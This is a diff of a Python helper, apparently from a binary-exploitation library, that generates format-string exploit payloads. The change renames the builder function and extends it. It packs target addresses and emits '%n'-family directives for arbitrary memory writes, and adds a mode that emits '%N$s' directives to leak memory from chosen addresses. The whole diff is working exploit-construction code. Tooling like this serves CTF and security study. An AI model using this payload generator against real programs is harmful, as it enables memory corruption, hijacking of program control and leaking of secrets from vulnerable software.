@@ -72,48 +72,61 @@ def offset_read(offset, read_pad, max_offset=None, round_to=None, pad_with="_"):
 		fmt += pad_with * (round_to - (len(fmt) % round_to))
 	return fmt
 
-def format_string(writes, byte_offset, current_length=0, pad_to=0, word_size=4, endness="<"):
+def absolute_string(byte_offset, writes=None, reads=None, read_length = None, current_length=0, pad_to=0, pad_with="_", word_size=4, endness="<"):
 	'''
 	Builds the whole format string
 
 	@param writes: a list of (addr, content_as_bytes) tuples to overwrite
+	@param reads: alternatively, a list of memory addresses to read from
+	@param read_length: the length to limit reads to
 	@param byte_offset: the offset in bytes on the stack to the format string
 	@param current_length: the length of the format string prefix (if there is one)
 	@param pad_to: the size of the format string to generate
+	@param pad_with: what character to pad with
 	@param word_size: the word size of the architecture
 	'''
 	l.debug("Starting format string build...")
 	format_start, word_offset = pad_to_offset(byte_offset, word_size=word_size)
-	format_start += "".join(struct.pack("=I", t) for t, _ in writes)
+
+	if writes is not None:
+		format_start += "".join(struct.pack(endness + "I", t) for t, _ in writes)
+	elif reads is not None:
+		format_start += "".join(struct.pack(endness + "I", t) for t in reads)
 	format_end = ""
 
-	current_length += len(format_start)
+	if writes is not None:
+		current_length += len(format_start)
 
-	modifiers = { 1: "hh", 2: "h", 4: "", 8: "ll" }
-	struct_fmts = { 1: "B", 2: "H", 4: "I", 8: "Q" }
-	for t, c in writes:
-		l.debug("... adding write to 0x%x of size %d", t, len(c))
-		v = struct.unpack(endness + struct_fmts[len(c)], c)[0]
-		next_length = (v - current_length) % (256 ** len(c))
+		modifiers = { 1: "hh", 2: "h", 4: "", 8: "ll" }
+		struct_fmts = { 1: "B", 2: "H", 4: "I", 8: "Q" }
+		for t, c in writes:
+			l.debug("... adding write to 0x%x of size %d", t, len(c))
+			v = struct.unpack(endness + struct_fmts[len(c)], c)[0]
+			next_length = (v - current_length) % (256 ** len(c))
 
-		# For 4 and less characters, printing directly is more efficient
-		# For 5 to 8, the general method can't be used
-		# Otherwise, use general method
-		if next_length < 5:
-			format_end += "A" * next_length
-		elif next_length < 8:
-			format_end += "%{:d}hhx".format(next_length)
-		else:
-			format_end += "%{:d}x".format(next_length)
-		current_length += next_length
+			# For 4 and less characters, printing directly is more efficient
+			# For 5 to 8, the general method can't be used
+			# Otherwise, use general method
+			if next_length < 5:
+				format_end += "A" * next_length
+			elif next_length < 8:
+				format_end += "%{:d}hhx".format(next_length)
+			else:
+				format_end += "%{:d}x".format(next_length)
+			current_length += next_length
 
-		format_end += "%{:d}${:s}n".format(word_offset, modifiers[len(c)])
-		word_offset += 1
+			format_end += "%{:d}${:s}n".format(word_offset, modifiers[len(c)])
+			word_offset += 1
+	elif reads is not None:
+		for t in reads:
+			length_str = ".%d"%read_length if read_length is not None else ""
+			format_end += "%{:d}${:s}s".format(word_offset, length_str)
+			word_offset += 1
 
 	# Pad and return the built format string
 	fmt = format_start + format_end
 	l.debug("... created format strng |%s| of length %s.", fmt, len(fmt))
-	return fmt + "B" * (pad_to - len(fmt))
+	return fmt + pad_with * (pad_to - len(fmt))
 
 #def main():
 #	import sys
